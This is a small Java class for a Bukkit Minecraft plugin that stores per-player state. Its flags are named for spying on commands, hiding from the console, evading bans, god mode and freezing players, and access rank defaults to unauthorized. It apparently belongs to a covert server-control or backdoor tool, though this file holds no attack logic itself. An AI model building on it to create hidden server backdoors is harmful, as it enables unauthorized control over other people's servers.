package fr.body.ectasy.user;

import org.bukkit.entity.Player;

public class User {
   public boolean spyingCmd;
   public Rank rank = Rank.UNAUTHORIZED;
   public boolean hidingConsole;
   public boolean chatModeEnabled;
   public boolean frozen;
   public boolean consoleLog;
   public Player player;
   public boolean godMode;
   public boolean antiBan;
   public boolean blatant = false;

   public User(Player bukkitPlayer) {
      this.hidingConsole = false;
      this.frozen = false;
      this.chatModeEnabled = false;
      this.godMode = false;
      this.spyingCmd = false;
      this.antiBan = true;
      this.consoleLog = false;
      this.player = bukkitPlayer;
   }
}
